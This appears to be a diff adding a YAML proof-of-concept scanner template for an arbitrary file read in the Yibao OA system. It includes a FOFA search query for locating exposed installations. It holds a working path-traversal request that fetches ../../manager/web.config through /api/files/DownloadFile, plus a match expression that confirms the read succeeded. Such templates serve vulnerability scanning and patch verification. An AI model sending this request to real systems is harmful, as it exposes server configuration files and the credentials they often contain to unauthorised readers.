@@ -1,0 +1,27 @@
+id: poc-yaml-yi-bao-oa-system-downloadfile-anyfile-read
+info:
+  name: 易宝OA系统 DownloadFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 易宝OA
+  fofa: body="欢迎登录易宝OA系统"
+requests:
+- method: POST
+  path: /api/files/DownloadFile
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"data\"") &&
+
+    contains(body,"\"message\":\"success\"") &&
+
+    contains(body,"\"is_succeed\":true") &&
+
+    contains(headers,"application/json")
+
+    '
+variables: {}
+transport: http
